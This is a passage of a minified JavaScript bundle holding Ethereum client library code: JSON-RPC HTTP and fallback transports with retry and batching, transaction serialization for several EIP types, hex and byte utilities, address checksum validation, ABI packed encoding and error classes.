Map;function JH({fn:t,id:e,shouldSplitBatch:r,wait:n=0,sort:i}){const s=async()=>{const u=c();o();const h=u.map(({args:d})=>d);h.length!==0&&t(h).then(d=>{i&&Array.isArray(d)&&d.sort(i);for(let f=0;f<u.length;f++){const{resolve:g}=u[f];g==null||g([d[f],d])}}).catch(d=>{for(let f=0;f<u.length;f++){const{reject:g}=u[f];g==null||g(d)}})},o=()=>kw.delete(e),a=()=>c().map(({args:u})=>u),c=()=>kw.get(e)||[],l=u=>kw.set(e,[...c(),u]);return{flush:o,async schedule(u){const{promise:h,resolve:d,reject:f}=ZH();return r!=null&&r([...a(),u])&&s(),c().length>0?(l({args:u,resolve:d,reject:f}),h):(l({args:u,resolve:d,reject:f}),setTimeout(s,n),h)}}}async function ZA(t){return new Promise(e=>setTimeout(e,t))}new s1(128);const Oy=256;let $p=Oy,Rp;function QH(t=11){if(!Rp||$p+t>Oy*2){Rp="",$p=0;for(let e=0;e<Oy;e++)Rp+=(256+Math.random()*256|0).toString(16).substring(1)}return Rp.substring($p,$p+++t)}const Dp=new s1(8192);function YH(t,{enabled:e=!0,id:r}){if(!e||!r)return t();if(Dp.get(r))return Dp.get(r);const n=t().finally(()=>Dp.delete(r));return Dp.set(r,n),n}function XH(t,{delay:e=100,retryCount:r=2,shouldRetry:n=()=>!0}={}){return new Promise((i,s)=>{const o=async({count:a=0}={})=>{const c=async({error:l})=>{const u=typeof e=="function"?e({count:a,error:l}):e;u&&await ZA(u),o({count:a+1})};try{const l=await t();i(l)}catch(l){if(a<r&&await n({count:a,error:l}))return c({error:l});s(l)}};o()})}function eq(t,e={}){return async(r,n={})=>{var h;const{dedupe:i=!1,methods:s,retryDelay:o=150,retryCount:a=3,uid:c}={...e,...n},{method:l}=r;if((h=s==null?void 0:s.exclude)!=null&&h.includes(l))throw new Ra(new Error("method not supported"),{method:l});if(s!=null&&s.include&&!s.include.includes(l))throw new Ra(new Error("method not supported"),{method:l});const u=i?IA(`${c}.${cc(r)}`):void 0;return YH(()=>XH(async()=>{try{return await t(r)}catch(d){const f=d;switch(f.code){case zd.code:throw new zd(f);case jd.code:throw new jd(f);case Hd.code:throw new Hd(f,{method:r.method});case qd.code:throw new qd(f);case qu.code:throw new qu(f);case Vd.code:throw new Vd(f);case Wd.code:throw new Wd(f);case Gd.code:throw new Gd(f);case Vu.code:throw new Vu(f);case Ra.code:throw new Ra(f,{method:r.method});case Wu.code:throw new Wu(f);case Kd.code:throw new Kd(f);case lc.code:throw new lc(f);case Zd.code:throw new Zd(f);case Jd.code:throw new Jd(f);case Qd.code:throw new Qd(f);case Yd.code:throw new Yd(f);case Xd.code:throw new Xd(f);case ef.code:throw new ef(f);case tf.code:throw new tf(f);case rf.code:throw new rf(f);case nf.code:throw new nf(f);case sf.code:throw new sf(f);case of.code:throw new of(f);case af.code:throw new af(f);case 5e3:throw new lc(f);default:throw d instanceof Je?d:new SH(f)}}},{delay:({count:d,error:f})=>{var g;if(f&&f instanceof Id){const p=(g=f==null?void 0:f.headers)==null?void 0:g.get("Retry-After");if(p!=null&&p.match(/\d/))return Number.parseInt(p)*1e3}return~~(1<<d)*o},retryCount:a,shouldRetry:({error:d})=>tq(d)}),{enabled:i,id:u})}}function tq(t){return"code"in t&&typeof t.code=="number"?t.code===-1||t.code===Wu.code||t.code===qu.code:t instanceof Id&&t.status?t.status===403||t.status===408||t.status===413||t.status===429||t.status===500||t.status===502||t.status===503||t.status===504:!0}function JA({key:t,methods:e,name:r,request:n,retryCount:i=3,retryDelay:s=150,timeout:o,type:a},c){const l=QH();return{config:{key:t,methods:e,name:r,request:n,retryCount:i,retryDelay:s,timeout:o,type:a},request:eq(n,{methods:e,retryCount:i,retryDelay:s,uid:l}),value:c}}function y4(t,e={}){const{key:r="fallback",name:n="Fallback",rank:i=!1,shouldThrow:s=rq,retryCount:o,retryDelay:a}=e;return({chain:c,pollingInterval:l=4e3,timeout:u,...h})=>{let d=t,f=()=>{};const g=JA({key:r,name:n,async request({method:p,params:w}){let m;const b=async(v=0)=>{const x=d[v]({...h,chain:c,retryCount:0,timeout:u});try{const I=await x.request({method:p,params:w});return f({method:p,params:w,response:I,transport:x,status:"success"}),I}catch(I){if(f({error:I,method:p,params:w,transport:x,status:"error"}),s(I)||v===d.length-1||(m??(m=d.slice(v+1).some(C=>{const{include:N,exclude:S}=C({chain:c}).config.methods||{};return N?N.includes(p):S?!S.includes(p):!0})),!m))throw I;return b(v+1)}};return b()},retryCount:o,retryDelay:a,type:"fallback"},{onResponse:p=>f=p,transports:d.map(p=>p({chain:c,retryCount:0}))});if(i){const p=typeof i=="object"?i:{};nq({chain:c,interval:p.interval??l,onTransports:w=>d=w,ping:p.ping,sampleCount:p.sampleCount,timeout:p.timeout,transports:d,weights:p.weights})}return g}}function rq(t){return!!("code"in t&&typeof t.code=="number"&&(t.code===Vu.code||t.code===lc.code||ky.nodeMessage.test(t.message)||t.code===5e3))}function nq({chain:t,interval:e=4e3,onTransports:r,ping:n,sampleCount:i=10,timeout:s=1e3,transports:o,weights:a={}}){const{stability:c=.7,latency:l=.3}=a,u=[],h=async()=>{const d=await Promise.all(o.map(async p=>{const w=p({chain:t,retryCount:0,timeout:s}),m=Date.now();let b,v;try{await(n?n({transport:w}):w.request({method:"net_listening"})),v=1}catch{v=0}finally{b=Date.now()}return{latency:b-m,success:v}}));u.push(d),u.length>i&&u.shift();const f=Math.max(...u.map(p=>Math.max(...p.map(({latency:w})=>w)))),g=o.map((p,w)=>{const m=u.map(I=>I[w].latency),b=1-m.reduce((I,C)=>I+C,0)/m.length/f,v=u.map(I=>I[w].success),x=v.reduce((I,C)=>I+C,0)/v.length;return x===0?[0,w]:[l*b+c*x,w]}).sort((p,w)=>w[0]-p[0]);r(g.map(([,p])=>o[p])),await ZA(e),h()};h()}class iq extends Je{constructor(){super("No URL was provided to the Transport. Please provide a valid RPC URL to the Transport.",{docsPath:"/docs/clients/intro",name:"UrlRequiredError"})}}function sq(t,{errorInstance:e=new Error("timed out"),timeout:r,signal:n}){return new Promise((i,s)=>{(async()=>{let o;try{const a=new AbortController;r>0&&(o=setTimeout(()=>{n?a.abort():s(e)},r)),i(await t({signal:(a==null?void 0:a.signal)||null}))}catch(a){(a==null?void 0:a.name)==="AbortError"&&s(e),s(a)}finally{clearTimeout(o)}})()})}function oq(){return{current:0,take(){return this.current++},reset(){this.current=0}}}const b4=oq();function aq(t,e={}){return{async request(r){var h;const{body:n,onRequest:i=e.onRequest,onResponse:s=e.onResponse,timeout:o=e.timeout??1e4}=r,a={...e.fetchOptions??{},...r.fetchOptions??{}},{headers:c,method:l,signal:u}=a;try{const d=await sq(async({signal:g})=>{const p={...a,body:Array.isArray(n)?cc(n.map(b=>({jsonrpc:"2.0",id:b.id??b4.take(),...b}))):cc({jsonrpc:"2.0",id:n.id??b4.take(),...n}),headers:{"Content-Type":"application/json",...c},method:l||"POST",signal:u||(o>0?g:null)},w=new Request(t,p),m=await(i==null?void 0:i(w,p))??{...p,url:t};return await fetch(m.url??t,m)},{errorInstance:new g4({body:n,url:t}),timeout:o,signal:!0});s&&await s(d);let f;if((h=d.headers.get("Content-Type"))!=null&&h.startsWith("application/json"))f=await d.json();else{f=await d.text();try{f=JSON.parse(f||"{}")}catch(g){if(d.ok)throw g;f={error:f}}}if(!d.ok)throw new Id({body:n,details:cc(f.error)||d.statusText,headers:d.headers,status:d.status,url:t});return f}catch(d){throw d instanceof Id||d instanceof g4?d:new Id({body:n,cause:d,url:t})}}}}function Bp(t,e={}){const{batch:r,fetchOptions:n,key:i="http",methods:s,name:o="HTTP JSON-RPC",onFetchRequest:a,onFetchResponse:c,retryDelay:l,raw:u}=e;return({chain:h,retryCount:d,timeout:f})=>{const{batchSize:g=1e3,wait:p=0}=typeof r=="object"?r:{},w=e.retryCount??d,m=f??e.timeout??1e4,b=t||(h==null?void 0:h.rpcUrls.default.http[0]);if(!b)throw new iq;const v=aq(b,{fetchOptions:n,onRequest:a,onResponse:c,timeout:m});return JA({key:i,methods:s,name:o,async request({method:x,params:I}){const C={method:x,params:I},{schedule:N}=JH({id:b,wait:p,shouldSplitBatch(D){return D.length>g},fn:D=>v.request({body:D}),sort:(D,z)=>D.id-z.id}),S=async D=>r?N(D):[await v.request({body:D})],[{error:P,result:T}]=await S(C);if(u)return{error:P,result:T};if(P)throw new LA({body:C,error:P,url:b});return T},retryCount:w,retryDelay:l,timeout:m,type:"http"},{fetchOptions:n,url:b})}}function di(t){return{formatters:void 0,fees:void 0,serializers:void 0,...t}}function cq(t){const{authorizationList:e}=t;if(e)for(const r of e){const{chainId:n}=r,i=r.address;if(!Ic(i))throw new xc({address:i});if(n<0)throw new a1({chainId:n})}l2(t)}function lq(t){const{blobVersionedHashes:e}=t;if(e){if(e.length===0)throw new KA;for(const r of e){const n=ju(r),i=og(pH(r,0,1));if(n!==32)throw new HH({hash:r,size:n});if(i!==GA)throw new qH({hash:r,version:i})}}l2(t)}function l2(t){const{chainId:e,maxPriorityFeePerGas:r,maxFeePerGas:n,to:i}=t;if(e<=0)throw new a1({chainId:e});if(i&&!Ic(i))throw new xc({address:i});if(n&&n>o2)throw new o1({maxFeePerGas:n});if(r&&n&&r>n)throw new FA({maxFeePerGas:n,maxPriorityFeePerGas:r})}function uq(t){const{chainId:e,maxPriorityFeePerGas:r,gasPrice:n,maxFeePerGas:i,to:s}=t;if(e<=0)throw new a1({chainId:e});if(s&&!Ic(s))throw new xc({address:s});if(r||i)throw new Je("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid EIP-2930 Transaction attribute.");if(n&&n>o2)throw new o1({maxFeePerGas:n})}function hq(t){const{chainId:e,maxPriorityFeePerGas:r,gasPrice:n,maxFeePerGas:i,to:s}=t;if(s&&!Ic(s))throw new xc({address:s});if(typeof e<"u"&&e<=0)throw new a1({chainId:e});if(r||i)throw new Je("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid Legacy Transaction attribute.");if(n&&n>o2)throw new o1({maxFeePerGas:n})}function c1(t){if(!t||t.length===0)return[];const e=[];for(let r=0;r<t.length;r++){const{address:n,storageKeys:i}=t[r];for(let s=0;s<i.length;s++)if(i[s].length-2!==64)throw new xH({storageKey:i[s]});if(!Ic(n,{strict:!1}))throw new xc({address:n});e.push([n,i])}return e}function dq(t,e){const r=GH(t);return r==="eip1559"?gq(t,e):r==="eip2930"?wq(t,e):r==="eip4844"?pq(t,e):r==="eip7702"?fq(t,e):mq(t,e)}function fq(t,e){const{authorizationList:r,chainId:n,gas:i,nonce:s,to:o,value:a,maxFeePerGas:c,maxPriorityFeePerGas:l,accessList:u,data:h}=t;cq(t);const d=c1(u),f=yq(r);return Xf(["0x04",gh([Oe(n),s?Oe(s):"0x",l?Oe(l):"0x",c?Oe(c):"0x",i?Oe(i):"0x",o??"0x",a?Oe(a):"0x",h??"0x",d,f,...ep(t,e)])])}function pq(t,e){const{chainId:r,gas:n,nonce:i,to:s,value:o,maxFeePerBlobGas:a,maxFeePerGas:c,maxPriorityFeePerGas:l,accessList:u,data:h}=t;lq(t);let d=t.blobVersionedHashes,f=t.sidecars;if(t.blobs&&(typeof d>"u"||typeof f>"u")){const v=typeof t.blobs[0]=="string"?t.blobs:t.blobs.map(C=>Ko(C)),x=t.kzg,I=jA({blobs:v,kzg:x});if(typeof d>"u"&&(d=zH({commitments:I})),typeof f>"u"){const C=HA({blobs:v,commitments:I,kzg:x});f=WH({blobs:v,commitments:I,proofs:C})}}const g=c1(u),p=[Oe(r),i?Oe(i):"0x",l?Oe(l):"0x",c?Oe(c):"0x",n?Oe(n):"0x",s??"0x",o?Oe(o):"0x",h??"0x",g,a?Oe(a):"0x",d??[],...ep(t,e)],w=[],m=[],b=[];if(f)for(let v=0;v<f.length;v++){const{blob:x,commitment:I,proof:C}=f[v];w.push(x),m.push(I),b.push(C)}return Xf(["0x03",gh(f?[p,w,m,b]:p)])}function gq(t,e){const{chainId:r,gas:n,nonce:i,to:s,value:o,maxFeePerGas:a,maxPriorityFeePerGas:c,accessList:l,data:u}=t;l2(t);const h=c1(l),d=[Oe(r),i?Oe(i):"0x",c?Oe(c):"0x",a?Oe(a):"0x",n?Oe(n):"0x",s??"0x",o?Oe(o):"0x",u??"0x",h,...ep(t,e)];return Xf(["0x02",gh(d)])}function wq(t,e){const{chainId:r,gas:n,data:i,nonce:s,to:o,value:a,accessList:c,gasPrice:l}=t;uq(t);const u=c1(c),h=[Oe(r),s?Oe(s):"0x",l?Oe(l):"0x",n?Oe(n):"0x",o??"0x",a?Oe(a):"0x",i??"0x",u,...ep(t,e)];return Xf(["0x01",gh(h)])}function mq(t,e){const{chainId:r=0,gas:n,data:i,nonce:s,to:o,value:a,gasPrice:c}=t;hq(t);let l=[s?Oe(s):"0x",c?Oe(c):"0x",n?Oe(n):"0x",o??"0x",a?Oe(a):"0x",i??"0x"];if(e){const u=(()=>{if(e.v>=35n)return(e.v-35n)/2n>0?e.v:27n+(e.v===35n?0n:1n);if(r>0)return BigInt(r*2)+BigInt(35n+e.v-27n);const f=27n+(e.v===27n?0n:1n);if(e.v!==f)throw new CH({v:e.v});return f})(),h=sg(e.r),d=sg(e.s);l=[...l,Oe(u),h==="0x00"?"0x":h,d==="0x00"?"0x":d]}else r>0&&(l=[...l,Oe(r),"0x","0x"]);return gh(l)}function ep(t,e){const r=e??t,{v:n,yParity:i}=r;if(typeof r.r>"u")return[];if(typeof r.s>"u")return[];if(typeof n>"u"&&typeof i>"u")return[];const s=sg(r.r),o=sg(r.s);return[typeof i=="number"?i?Oe(1):"0x":n===0n?"0x":n===1n?Oe(1):n===27n?"0x":Oe(1),s==="0x00"?"0x":s,o==="0x00"?"0x":o]}function yq(t){if(!t||t.length===0)return[];const e=[];for(const r of t){const{chainId:n,nonce:i,...s}=r,o=r.address;e.push([n?Oe(n):"0x",o,i?Oe(i):"0x",...ep({},s)])}return e}const bq={"0x0":"reverted","0x1":"success"};function vq(t){const e={...t,blockNumber:t.blockNumber?BigInt(t.blockNumber):null,contractAddress:t.contractAddress?t.contractAddress:null,cumulativeGasUsed:t.cumulativeGasUsed?BigInt(t.cumulativeGasUsed):null,effectiveGasPrice:t.effectiveGasPrice?BigInt(t.effectiveGasPrice):null,gasUsed:t.gasUsed?BigInt(t.gasUsed):null,logs:t.logs?t.logs.map(r=>KH(r)):null,to:t.to?t.to:null,transactionIndex:t.transactionIndex?og(t.transactionIndex):null,status:t.status?bq[t.status]:null,type:t.type?zA[t.type]||t.type:null};return t.blobGasPrice&&(e.blobGasPrice=BigInt(t.blobGasPrice)),t.blobGasUsed&&(e.blobGasUsed=BigInt(t.blobGasUsed)),e}const Eq=s2("transactionReceipt",vq),Cq=new Uint8Array([7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8]),QA=new Uint8Array(new Array(16).fill(0).map((t,e)=>e)),Aq=QA.map(t=>(9*t+5)%16);let xq=[QA],Iq=[Aq];for(let t=0;t<4;t++)for(let e of[xq,Iq])e.push(e[t].map(r=>Cq[r]));/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const l1=BigInt(0),u1=BigInt(1),Sq=BigInt(2);function Sc(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function tp(t){if(!Sc(t))throw new Error("Uint8Array expected")}function Gu(t,e){if(typeof e!="boolean")throw new Error(t+" boolean expected, got "+e)}const Nq=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function Ku(t){tp(t);let e="";for(let r=0;r<t.length;r++)e+=Nq[t[r]];return e}function Bl(t){const e=t.toString(16);return e.length&1?"0"+e:e}function u2(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);return t===""?l1:BigInt("0x"+t)}const is={_0:48,_9:57,A:65,F:70,a:97,f:102};function v4(t){if(t>=is._0&&t<=is._9)return t-is._0;if(t>=is.A&&t<=is.F)return t-(is.A-10);if(t>=is.a&&t<=is.f)return t-(is.a-10)}function Zu(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);const e=t.length,r=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const n=new Uint8Array(r);for(let i=0,s=0;i<r;i++,s+=2){const o=v4(t.charCodeAt(s)),a=v4(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}n[i]=o*16+a}return n}function uc(t){return u2(Ku(t))}function h2(t){return tp(t),u2(Ku(Uint8Array.from(t).reverse()))}function Ju(t,e){return Zu(t.toString(16).padStart(e*2,"0"))}function d2(t,e){return Ju(t,e).reverse()}function Pq(t){return Zu(Bl(t))}function ri(t,e,r){let n;if(typeof e=="string")try{n=Zu(e)}catch(s){throw new Error(t+" must be hex string or Uint8Array, cause: "+s)}else if(Sc(e))n=Uint8Array.from(e);else throw new Error(t+" must be hex string or Uint8Array");const i=n.length;if(typeof r=="number"&&i!==r)throw new Error(t+" of length "+r+" expected, got "+i);return n}function cf(...t){let e=0;for(let n=0;n<t.length;n++){const i=t[n];tp(i),e+=i.length}const r=new Uint8Array(e);for(let n=0,i=0;n<t.length;n++){const s=t[n];r.set(s,i),i+=s.length}return r}function kq(t,e){if(t.length!==e.length)return!1;let r=0;for(let n=0;n<t.length;n++)r|=t[n]^e[n];return r===0}function Oq(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}const Ow=t=>typeof t=="bigint"&&l1<=t;function h1(t,e,r){return Ow(t)&&Ow(e)&&Ow(r)&&e<=t&&t<r}function hc(t,e,r,n){if(!h1(e,r,n))throw new Error("expected valid "+t+": "+r+" <= n < "+n+", got "+e)}function YA(t){let e;for(e=0;t>l1;t>>=u1,e+=1);return e}function _q(t,e){return t>>BigInt(e)&u1}function Tq(t,e,r){return t|(r?u1:l1)<<BigInt(e)}const f2=t=>(Sq<<BigInt(t-1))-u1,_w=t=>new Uint8Array(t),E4=t=>Uint8Array.from(t);function XA(t,e,r){if(typeof t!="number"||t<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof r!="function")throw new Error("hmacFn must be a function");let n=_w(t),i=_w(t),s=0;const o=()=>{n.fill(1),i.fill(0),s=0},a=(...u)=>r(i,n,...u),c=(u=_w())=>{i=a(E4([0]),u),n=a(),u.length!==0&&(i=a(E4([1]),u),n=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let u=0;const h=[];for(;u<e;){n=a();const d=n.slice();h.push(d),u+=n.length}return cf(...h)};return(u,h)=>{o(),c(u);let d;for(;!(d=h(l()));)c();return o(),d}}const $q={bigint:t=>typeof t=="bigint",function:t=>typeof t=="function",boolean:t=>typeof t=="boolean",string:t=>typeof t=="string",stringOrUint8Array:t=>typeof t=="string"||Sc(t),isSafeInteger:t=>Number.isSafeInteger(t),array:t=>Array.isArray(t),field:(t,e)=>e.Fp.isValid(t),hash:t=>typeof t=="function"&&Number.isSafeInteger(t.outputLen)};function rp(t,e,r={}){const n=(i,s,o)=>{const a=$q[s];if(typeof a!="function")throw new Error("invalid validator function");const c=t[i];if(!(o&&c===void 0)&&!a(c,t))throw new Error("param "+String(i)+" is invalid. Expected "+s+", got "+c)};for(const[i,s]of Object.entries(e))n(i,s,!1);for(const[i,s]of Object.entries(r))n(i,s,!0);return t}const Rq=()=>{throw new Error("not implemented")};function _y(t){const e=new WeakMap;return(r,...n)=>{const i=e.get(r);if(i!==void 0)return i;const s=t(r,...n);return e.set(r,s),s}}var Dq=Object.freeze({__proto__:null,isBytes:Sc,abytes:tp,abool:Gu,bytesToHex:Ku,numberToHexUnpadded:Bl,hexToNumber:u2,hexToBytes:Zu,bytesToNumberBE:uc,bytesToNumberLE:h2,numberToBytesBE:Ju,numberToBytesLE:d2,numberToVarBytesBE:Pq,ensureBytes:ri,concatBytes:cf,equalBytes:kq,utf8ToBytes:Oq,inRange:h1,aInRange:hc,bitLen:YA,bitGet:_q,bitSet:Tq,bitMask:f2,createHmacDrbg:XA,validateObject:rp,notImplemented:Rq,memoized:_y});const Bq="0.1.1";function Lq(){return Bq}class Or extends Error{constructor(e,r={}){const n=(()=>{var a;if(r.cause instanceof Or){if(r.cause.details)return r.cause.details;if(r.cause.shortMessage)return r.cause.shortMessage}return(a=r.cause)!=null&&a.message?r.cause.message:r.details})(),i=r.cause instanceof Or&&r.cause.docsPath||r.docsPath,s=`https://oxlib.sh${i??""}`,o=[e||"An error occurred.",...r.metaMessages?["",...r.metaMessages]:[],...n||i?["",n?`Details: ${n}`:void 0,i?`See: ${s}`:void 0]:[]].filter(a=>typeof a=="string").join(`
`);super(o,r.cause?{cause:r.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docs",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"cause",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:`ox@${Lq()}`}),this.cause=r.cause,this.details=n,this.docs=s,this.docsPath=i,this.shortMessage=e}walk(e){return e9(this,e)}}function e9(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause?e9(t.cause,e):e?null:t}function Uq(t,e){if(A4(t)>e)throw new Wq({givenSize:A4(t),maxSize:e})}const ss={zero:48,nine:57,A:65,F:70,a:97,f:102};function C4(t){if(t>=ss.zero&&t<=ss.nine)return t-ss.zero;if(t>=ss.A&&t<=ss.F)return t-(ss.A-10);if(t>=ss.a&&t<=ss.f)return t-(ss.a-10)}function Mq(t,e={}){const{dir:r,size:n=32}=e;if(n===0)return t;if(t.length>n)throw new Gq({size:t.length,targetSize:n,type:"Bytes"});const i=new Uint8Array(n);for(let s=0;s<n;s++){const o=r==="right";i[o?s:n-s-1]=t[o?s:t.length-s-1]}return i}function p2(t,e){if(Ty(t)>e)throw new eV({givenSize:Ty(t),maxSize:e})}function t9(t,e={}){const{dir:r,size:n=32}=e;if(n===0)return t;const i=t.replace("0x","");if(i.length>n*2)throw new tV({size:Math.ceil(i.length/2),targetSize:n,type:"Hex"});return`0x${i[r==="right"?"padEnd":"padStart"](n*2,"0")}`}const Fq=new TextEncoder;function zq(t){return t instanceof Uint8Array?t:typeof t=="string"?Hq(t):jq(t)}function jq(t){return t instanceof Uint8Array?t:new Uint8Array(t)}function Hq(t,e={}){const{size:r}=e;let n=t;r&&(p2(t,r),n=g2(t,r));let i=n.slice(2);i.length%2&&(i=`0${i}`);const s=i.length/2,o=new Uint8Array(s);for(let a=0,c=0;a<s;a++){const l=C4(i.charCodeAt(c++)),u=C4(i.charCodeAt(c++));if(l===void 0||u===void 0)throw new Or(`Invalid byte sequence ("${i[c-2]}${i[c-1]}" in "${i}").`);o[a]=l*16+u}return o}function qq(t,e={}){const{size:r}=e,n=Fq.encode(t);return typeof r=="number"?(Uq(n,r),Vq(n,r)):n}function Vq(t,e){return Mq(t,{dir:"right",size:e})}function A4(t){return t.length}class Wq extends Or{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed \`${r}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeOverflowError"})}}class Gq extends Or{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${r}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Bytes.SizeExceedsPaddingSizeError"})}}const Kq=new TextEncoder,Zq=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function r9(...t){return`0x${t.reduce((e,r)=>e+r.replace("0x",""),"")}`}function Jq(t,e={}){const r=`0x${Number(t)}`;return typeof e.size=="number"?(p2(r,e.size),cg(r,e.size)):r}function n9(t,e={}){let r="";for(let i=0;i<t.length;i++)r+=Zq[t[i]];const n=`0x${r}`;return typeof e.size=="number"?(p2(n,e.size),g2(n,e.size)):n}function Qq(t,e={}){const{signed:r,size:n}=e,i=BigInt(t);let s;n?r?s=(1n<<BigInt(n)*8n-1n)-1n:s=2n**(BigInt(n)*8n)-1n:typeof t=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&r?-s-1n:0;if(s&&i>s||i<o){const c=typeof t=="bigint"?"n":"";throw new Xq({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:r,size:n,value:`${t}${c}`})}const a=`0x${(r&&i<0?(1n<<BigInt(n*8))+BigInt(i):i).toString(16)}`;return n?cg(a,n):a}function Yq(t,e={}){return n9(Kq.encode(t),e)}function cg(t,e){return t9(t,{dir:"left",size:e})}function g2(t,e){return t9(t,{dir:"right",size:e})}function Ty(t){return Math.ceil((t.length-2)/2)}class Xq extends Or{constructor({max:e,min:r,signed:n,size:i,value:s}){super(`Number \`${s}\` is not in safe${i?` ${i*8}-bit`:""}${n?" signed":" unsigned"} integer range ${e?`(\`${r}\` to \`${e}\`)`:`(above \`${r}\`)`}`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.IntegerOutOfRangeError"})}}let eV=class extends Or{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed \`${r}\` bytes. Given size: \`${e}\` bytes.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeOverflowError"})}};class tV extends Or{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (\`${e}\`) exceeds padding size (\`${r}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Hex.SizeExceedsPaddingSizeError"})}}function rV(t,e={}){const{as:r=typeof t=="string"?"Hex":"Bytes"}=e,n=$A(zq(t));return r==="Bytes"?n:n9(n)}class nV extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const r=super.get(e);return super.has(e)&&r!==void 0&&(this.delete(e),super.set(e,r)),r}set(e,r){if(super.set(e,r),this.maxSize&&this.size>this.maxSize){const n=this.keys().next().value;n&&this.delete(n)}return this}}const iV={checksum:new nV(8192)},Tw=iV.checksum,sV=/^0x[a-fA-F0-9]{40}$/;function i9(t,e={}){const{strict:r=!0}=e;if(!sV.test(t))throw new x4({address:t,cause:new aV});if(r){if(t.toLowerCase()===t)return;if(oV(t)!==t)throw new x4({address:t,cause:new cV})}}function oV(t){if(Tw.has(t))return Tw.get(t);i9(t,{strict:!1});const e=t.substring(2).toLowerCase(),r=rV(qq(e),{as:"Bytes"}),n=e.split("");for(let s=0;s<40;s+=2)r[s>>1]>>4>=8&&n[s]&&(n[s]=n[s].toUpperCase()),(r[s>>1]&15)>=8&&n[s+1]&&(n[s+1]=n[s+1].toUpperCase());const i=`0x${n.join("")}`;return Tw.set(t,i),i}class x4 extends Or{constructor({address:e,cause:r}){super(`Address "${e}" is invalid.`,{cause:r}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidAddressError"})}}class aV extends Or{constructor(){super("Address is not a 20 byte (40 hexadecimal character) value."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidInputError"})}}class cV extends Or{constructor(){super("Address does not match its checksum counterpart."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidChecksumError"})}}const lV=/^(.*)\[([0-9]*)\]$/,uV=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,hV=/^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/;function $y(t,e){if(t.length!==e.length)throw new fV({expectedLength:t.length,givenLength:e.length});const r=[];for(let n=0;n<t.length;n++){const i=t[n],s=e[n];r.push($y.encode(i,s))}return r9(...r)}(function(t){function e(r,n,i=!1){if(r==="address"){const c=n;return i9(c),cg(c.toLowerCase(),i?32:0)}if(r==="string")return Yq(n);if(r==="bytes")return n;if(r==="bool")return cg(Jq(n),i?32:1);const s=r.match(hV);if(s){const[c,l,u="256"]=s,h=Number.parseInt(u)/8;return Qq(n,{size:i?32:h,signed:l==="int"})}const o=r.match(uV);if(o){const[c,l]=o;if(Number.parseInt(l)!==(n.length-2)/2)throw new dV({expectedSize:Number.parseInt(l),value:n});return g2(n,i?32:0)}const a=r.match(lV);if(a&&Array.isArray(n)){const[c,l]=a,u=[];for(let h=0;h<n.length;h++)u.push(e(l,n[h],!0));return u.length===0?"0x":r9(...u)}throw new pV(r)}t.encode=e})($y||($y={}));class dV extends Or{constructor({expectedSize:e,value:r}){super(`Size of bytes "${r}" (bytes${Ty(r)}) does not match expected size (bytes${e}).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiParameters.BytesSizeMismatchError"})}}class fV extends Or{constructor({expectedLength:e,givenLength:r}){super(["ABI encoding parameters/values length mismatch.",`Expected length (parameters): ${e}`,`Given length (values): ${r}`].join(`
